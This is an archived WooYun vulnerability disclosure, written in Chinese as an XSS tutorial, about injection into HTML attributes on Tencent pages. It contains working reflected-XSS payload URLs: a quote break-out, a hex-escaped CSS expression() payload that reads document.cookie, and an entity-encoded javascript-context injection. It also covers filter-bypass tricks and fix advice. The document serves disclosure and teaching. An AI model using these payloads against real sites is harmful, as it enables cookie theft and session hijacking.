@@ -1,0 +1,429 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 3. 输出在HTML属性里的情况  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 3. 输出在HTML属性里的情况  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-13 16:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-06：	细节向普通白帽子公开<br/>
+									2013-01-16：	细节向实习白帽子公开<br/>
+									2013-01-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">和前面的不一样的时，有时候，输出会出现在HTML标签的属性之中。<br />
+例如： &lt;input value=&quot;输出&quot;&gt; 、 &lt;img onload=&quot;...[输出]...&quot;&gt; ，再比如 &lt;body style=&quot;...[输出]...&quot;&gt; .. 这个时候怎么办呢？</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 大网站一般不是吃素的。前面讲到的基本情况，一般都很少遇到了。<br />
+<br />
+<br />
+<br />
+2. 这个时候我们可以把目光发展一下，找一找在【输出】出现在HTML属性里的情况。<br />
+<br />
+<br />
+<br />
+3. 最为典型的一种情况，是下面这样的。<br />
+<br />
+<br />
+<br />
+http://xxxx.com/search.php?word=乌云欢迎您<br />
+<br />
+<br />
+<br />
+HTML代码里则是下面这样情况的。<br />
+<br />
+<br />
+<br />
+</p><pre><code>.. 关键词：&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+如果这里的word没过滤双引号。就会有以下的情况发生。<br />
+<br />
+<br />
+<br />
+http://xxxx.com/search.php?word=乌云欢迎您&quot; onclick=&quot;alert(1)<br />
+<br />
+<br />
+<br />
+对应的源代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+解析：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/13151622943e30ef2ff01e86f3bf1f12a5f7a5c0.jpg" target="_blank"><img src="../images/13151622943e30ef2ff01e86f3bf1f12a5f7a5c0.jpg" alt="8.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+那么当用户点击这个文本框时，就会触发 alert(1) 。<br />
+<br />
+<br />
+<br />
+4. 当然理想是美好的，现实总是残酷的，我水平有限，并没有在腾讯找到这样的例子。<br />
+<br />
+<br />
+<br />
+因为绝大部分这样的情况， 腾讯都会做出相应的过滤。<br />
+<br />
+<br />
+<br />
+过滤方法也挺简单，将 &quot; 过滤为 &amp;quot; 就行。<br />
+<br />
+<br />
+<br />
+过滤后的代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&amp;quot; onclick=&amp;quot;alert(1)&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+5. 一般来说，上面的情况，过滤了 &quot; ，可以说是高枕无忧了，但是事实并非如此。某些情况下。我们依然可以继续XSS。下面以腾讯为例。<br />
+<br />
+<br />
+<br />
+---------------------------------------------------------<br />
+<br />
+<br />
+<br />
+6. 首先看第一种场景。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=我是一个兵,爱国爱人民&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这里的bg参数过滤了【几乎】所有的东西。但是它输出在了 &lt;body style=&quot;[这里]&quot;&gt;<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/13152306bb005590e7b2859f5b157234729f5c32.jpg" target="_blank"><img src="../images/13152306bb005590e7b2859f5b157234729f5c32.jpg" alt="9.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+更重要的是，这里没有过滤 \ ，反斜线， 而 css里，允许使用转义字符, \ + ascii16进制形式。这样一来，我们就可以构造利用语句啦。<br />
+<br />
+<br />
+<br />
+这里过滤了expression, 我们也可以轻松的用expr\65ssion绕过。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+效果如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1315271104998f9ad3cb6a53ceb6ed1b7fc5ec1d.jpg" target="_blank"><img src="../images/1315271104998f9ad3cb6a53ceb6ed1b7fc5ec1d.jpg" alt="10.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这种情况，遗憾之处在于，基于 css expression 的XSS 已经进入暮年了，只有在IE6，7 下方能触发，受众面小。这里只是作为一个案例来讲讲。<br />
+<br />
+<br />
+<br />
+Tips: 至于这里的转义是如何写的：步骤如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>例如 e 的 ascii 16进制是 65, 我们就写为 \65<br />
+<br />
+expression -&gt;  expr\65ssion。</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+本例缺陷点代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;body style=&quot;overflow:auto;background-color:#我是一个兵，爱国爱人民;&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+-----------------------------------------------<br />
+<br />
+<br />
+<br />
+7. 再来看下一个在属性里的案例。这个例子也是比较常见的。比如：<br />
+<br />
+<br />
+<br />
+&lt;HTML标签  onXXXX=&quot;...[输出在这里]..&quot;&gt; 的例子。<br />
+<br />
+&lt;a href=&quot;javascript:[输出在这里]&quot;&gt;xxxx &lt;/a&gt; 的例子。<br />
+<br />
+<br />
+<br />
+正好，在腾讯的这个例子中，以上2个情况一起出现了。 我们以其中一种进行讲解。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看输出，如下，aaaaaaaa 出现在了2个点。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/131538532c69f31522834459163af637b764a034.jpg" target="_blank"><img src="../images/131538532c69f31522834459163af637b764a034.jpg" alt="11.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+常规来说，因为 onxxxx=&quot;[输出]&quot; 和 href=&quot;javascript:[输出]&quot; 与 &lt;script&gt;[输出]&lt;/script&gt; 没有太大区别。因为[输出]所在的地方，都是javascript脚本。<br />
+<br />
+<br />
+<br />
+但是&lt;script&gt;[输出]&lt;/script&gt; 如果被过滤，往往没有太好的办法。<br />
+<br />
+<br />
+<br />
+而上面这2种情况，则有一个很好的办法绕过过滤。<br />
+<br />
+<br />
+<br />
+Tips:<br />
+<br />
+<br />
+<br />
+</p><pre><code>在HTML属性中，会自动对实体字符进行转义。一个简单的比方。<br />
+   &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;<br />
+   和<br />
+   &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; <br />
+   是等效的</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+换言之，只要上面的情况，没有过滤 &amp;，# 等符号，我们就可以写入任意字符。<br />
+<br />
+<br />
+<br />
+看看缺陷点的代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;li&gt;&lt;input type=&quot;text&quot; id=&quot;pagenum&quot;  class=&quot;inputstyle0814&quot;  onkeydown=&quot;if ((event.keyCode==13) &amp;&amp; (this.value!=&#039;&#039;)) location.href=&#039;http://stock.finance.qq.com/report/search.php?offset=&#039;+this.value+&#039;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa&#039;&quot;/&gt;&lt;/li&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+JS部分我们可以做以下构造,由于&#039;被过滤，我们可以将&#039;写为 &amp;#x27;<br />
+<br />
+<br />
+<br />
+location.href=&#039;........&amp;searchvalue_yjbg=aaaaaa&#039;<br />
+<br />
+location.href=&#039;........&amp;searchvalue_yjbg=aaaaaa&#039;+alert(1)+&#039;&#039;<br />
+<br />
+location.href=&#039;........&amp;searchvalue_yjbg=aaaaaa&amp;#x27;+alert(1)+&amp;#x27;&#039;<br />
+<br />
+<br />
+<br />
+步骤如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/131546318a02185614a16336a1a29292066401e7.jpg" target="_blank"><img src="../images/131546318a02185614a16336a1a29292066401e7.jpg" alt="12.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+接着我们把代码转换为 url 的编码。 &amp;-&gt; %26,  # -&gt; %23<br />
+<br />
+<br />
+<br />
+最后利用代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+用户点击页面[GO]按钮触发。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/13155649184ffa872bd5cf975ed7d121aff7e9ea.jpg" target="_blank"><img src="../images/13155649184ffa872bd5cf975ed7d121aff7e9ea.jpg" alt="13.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+由于缺陷点是发生在 onkeydown 或 a 标签的 href 属性中，无法自动触发，因而使得威胁减小，如果是发生在 img 的 onload 属性，则非常可能导致自动触发。<br />
+<br />
+<br />
+<br />
+缺陷页面的 &lt;a href=&quot;&quot;&gt; 触发点的代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;li&gt;&lt;div class=&quot;yebg&quot;&gt;&lt;a href=&quot;javascript:location=&#039;http://stock.finance.qq.com/report/search.php?offset=&#039;+document.getElementById(&#039;pagenum&#039;).value+&#039;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa&#039;&quot;&gt;GO&lt;/a&gt;&lt;/div&gt;&lt;/li&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详情。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 对于输出在HTML属性中的情况，需要特殊情况特殊对待，该过滤\的时候，请过滤\, 该过滤&amp;的情况，则过滤掉&amp;<br />
+<br />
+<br />
+<br />
+2. 碰到有某些修复的人用正则去判断， &amp;#xNNN.., 而实际上 &amp;#x0NN; &amp;#x00NN, （后面自己慢慢试。。） 都是可以的。 或者是 &amp;#10进制; 以及一些特殊的HTML实体，如 &amp;quot;等，都要注意到，好麻烦， 最好的办法，还是 &amp;过滤为 &amp;amp; ：） </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015963" title="[腾讯实例教程] 那些年我们一起学XSS - 3. 输出在HTML属性里的情况">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-17 14:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15963";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
